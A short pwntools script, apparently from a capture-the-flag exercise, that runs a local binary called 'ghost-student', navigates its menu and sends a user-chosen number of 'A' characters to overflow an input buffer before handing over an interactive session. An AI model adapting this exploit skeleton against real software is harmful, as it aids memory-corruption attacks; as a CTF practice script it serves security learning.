from pwn import *

p = process("./ghost-student")

p.recvuntil(">>>")
p.sendline('3')
p.recvuntil(">>>")
p.sendline('6')
n = int(input())
p.sendline('A'*n)
p.interactive()
